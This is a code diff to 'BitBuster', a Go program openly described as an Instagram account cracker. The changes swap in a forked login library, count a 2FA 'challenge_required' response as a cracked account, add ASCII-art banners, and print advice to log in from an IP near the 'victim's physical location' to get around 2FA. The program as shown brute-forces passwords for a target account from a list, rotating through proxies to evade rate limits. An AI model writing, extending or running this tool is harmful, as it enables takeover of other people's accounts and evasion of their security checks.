@@ -9,7 +9,7 @@ import (
 	"sync"
 	"time"
 
-	"github.com/ahmdrz/goinsta"
+	"github.com/petercunha/goinsta"
 )
 
 // Constants
@@ -91,13 +91,20 @@ func workerThread(workerNumber int) {
 		// Test login informaton
 		result := login(USERNAME, password, "http://"+proxy, workerNumber)
 
-		if result == 0 {
+		if result == 0 || result == 3 {
 			/*
 			 *	Account cracked!
 			 */
-			fmt.Println("\n\nWorker #", workerNumber, "has cracked the account!")
+
+			if result == 3 {
+				error2FAmsg()
+			}
+
+			fmt.Println()
+			fmt.Println("Worker #", workerNumber, "has cracked the account!")
 			fmt.Println("Username:", USERNAME + "\n" +
-									"Password:", password + "\n")
+						"Password:", password)
+
 			os.Exit(0)
 		} else if result == 2 {
 			/*
@@ -147,22 +154,36 @@ func workerThread(workerNumber int) {
  *	 	0 for success
  *	 	1 for bad password
  *		2 for rate-limit or connection error
+ *		3 for success, but 2FA issues
  */
 func login(user string, pass string, proxy string, workerNumber int) int {
 
-	//fmt.Println(user+":"+pass)
-
+	// Create a login-via-proxy object
 	insta := goinsta.NewViaProxy(user, pass, proxy)
+
+	// Attempt to login
 	if err := insta.Login(); err != nil {
-		// fmt.Println(err)
+
+		// Return bad password code.
 		if strings.Contains(err.Error(), `"error_type": "bad_password"`) {
 			return 1
 		}
+
+		// Return success code. 
+		// Login worked but a challenge was encountered.
+		if strings.Contains(err.Error(), `"message": "challenge_required"`) {
+			defer insta.Logout()
+			cracked = true
+			return 3
+		}
+
+		// Return unknown error code. 
+		// This code causes the worker to pop the password back onto the slice, and pull out a new proxy.
 		return 2
 	}
 
+	// Clean success. Gained access to the account without encountering 2FA issues.
 	defer insta.Logout()
-
 	cracked = true
 	return 0
 }
@@ -213,16 +234,30 @@ func checkConn(proxy string) bool {
 // Prints the welcome banner
 func welcomeMessage() {
 	fmt.Println(`
-|------------------------------------------|
-|   BitBuster v1.0                         |
+ __________________________________________
+/   BitBuster v1.0                         \
 |   Instagram Account Cracker              |
 |                                          |
 |   Written and maintained by Peter Cunha  |
-|   https://github.com/petercunha          |
-|------------------------------------------|
-		`)
+\   https://github.com/petercunha          /
+ ------------------------------------------
+ \     ____________ 
+  \    |__________|
+      /           /\
+     /           /  \
+    /___________/___/|
+    |          |     |
+    |  ==\ /== |     |
+    |   O   O  | \ \ |
+    |     <    |  \ \|
+   /|          |   \ \
+  / |  \_____/ |   / /
+ / /|          |  / /|
+/||\|          | /||\/
+    -------------|   
+        | |    | | 
+       <__/    \__>`)
 
-	fmt.Println("BitBuster is initializing...")
 }
 
 // Prints the initialized message
@@ -252,7 +287,6 @@ func initializedMessage() {
 func statusLoop() {
 	for true {
 		time.Sleep(time.Second * 10)
-		fmt.Println()
 		fmt.Println("<< STATUS UPDATE >>")
 		fmt.Println("Passwords remaining:", len(passwords))
 		fmt.Println("Proxies remaining:", len(proxies))
@@ -263,7 +297,42 @@ func statusLoop() {
 
 // Prints the failure message
 func failedMessage() {
-	fmt.Println("\n\nBitBuster was not able to crack the account. Sorry :(")
+	fmt.Println()
+	fmt.Println(` ______________________________________ 
+/ You get nothing! You lose! Good day, \
+\ sir!                                 /
+ -------------------------------------- 
+ \     ____________ 
+  \    |__________|
+      /           /\
+     /           /  \
+    /___________/___/|
+    |          |     |
+    |  ==\ /== |     |
+    |   O   O  | \ \ |
+    |     <    |  \ \|
+   /|          |   \ \
+  / |  \_____/ |   / /
+ / /|          |  / /|
+/||\|          | /||\/
+    -------------|   
+        | |    | | 
+       <__/    \__>`)
+	fmt.Println("\nBitBuster was not able to crack the account, none of the passwords worked!")
+}
+
+// Login successful but 2FA issues encountered
+func error2FAmsg() {
+	fmt.Println(`
+------------------------------------------------------------------------
+IMPORTANT NOTE:
+BitBuster was able to crack the account, but has encountered 2FA issues.
+
+Suggestions:
+	* Wait 5-10 minutes before logging in
+	* Login with an IP close to your victim's physical location
+	* If that doesn't work, try logging in via the mobile app
+------------------------------------------------------------------------`)
 }
 
 // Prints pretty dots
